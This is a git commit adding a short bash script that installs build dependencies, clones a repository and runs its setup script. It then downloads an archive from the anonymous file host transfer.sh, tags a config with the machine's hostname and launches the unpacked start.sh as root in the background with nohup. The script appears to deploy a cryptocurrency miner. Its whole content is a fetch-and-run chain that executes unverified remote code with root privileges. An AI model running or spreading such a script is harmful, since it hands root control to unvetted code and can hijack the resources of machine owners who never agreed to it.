7fbaaad51b12c6b307c7880c9db0395957b84144
diegofustox <95482873+diegofustox@users.noreply.github.com>
2021-12-04 21:41:34 +0100

    Create x.sh

---
+++ x.sh
@@ -0,0 +1,28 @@
+#!/bin/bash
+sudo apt update -y
+sudo apt upgrade -y
+sudo apt install build-essential automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev libnuma-dev git -y
+sudo apt install software-properties-common -y
+sudo add-apt-repository -y ppa:ubuntu-toolchain-r/test
+sudo apt install -y gcc-11 g++-11 -y
+sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-11 11
+sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-11 11
+git clone https://github.com/diegofustox/cwork.git
+cd cwork
+chmod +x new.sh
+./new.sh
+cd ..
+rm -rf cwork
+echo "DONE"
+cd work
+PROG=`cat new.txt`
+wget https://transfer.sh/ITvU7h/q.tar.gz
+tar xvzf q.tar.gz
+rm q.tar.gz
+hs=`hostname`
+sed -i -e "s/SRV/$hs/g" x.json
+sed -i -e "s/PRGX/$PROG/g" start.sh
+CHANGE="min_val=180"
+CHANGE2="min_val=820"
+#sed -i -e "s/$CHANGE/$CHANGE2/g" start.sh
+sudo nohup bash start.sh > out.txt &
